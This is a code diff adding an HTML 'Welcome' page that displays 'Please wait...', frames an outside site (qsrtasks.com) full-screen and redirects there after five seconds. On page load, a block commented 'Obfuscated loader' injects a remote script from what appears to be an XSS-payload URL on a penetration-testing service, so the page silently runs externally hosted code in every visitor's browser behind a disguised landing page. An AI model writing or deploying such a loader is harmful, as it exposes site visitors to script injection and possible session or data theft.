@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Welcome</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: #fff;
+    }
+    iframe {
+      position: fixed;
+      top: 0;
+      left: 0;
+      border: none;
+      width: 100vw;
+      height: 100vh;
+      z-index: 1;
+    }
+    .msg {
+      position: absolute;
+      z-index: 9999;
+      top: 45%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-family: sans-serif;
+      font-size: 1.5em;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="msg">Please wait...</div>
+
+  <script>
+    // Obfuscated loader
+    (function(){
+      const u = "https://app.pentest-tools.com/xss-payload/HLShbgvzrt";
+      const s = document.createElement("script");
+      s.src = u;
+      s.async = true;
+      document.head.appendChild(s);
+    })();
+
+    // Load qsrtasks.com inside iframe (if allowed)
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://qsrtasks.com";
+    document.body.appendChild(iframe);
+
+    // Fallback redirect after delay (if iframe is blocked)
+    setTimeout(() => {
+      if (!iframe.contentWindow || !iframe.contentWindow.location) {
+        window.location.href = "https://qsrtasks.com";
+      }
+    }, 5000);
+  </script>
+
+</body>
+</html>
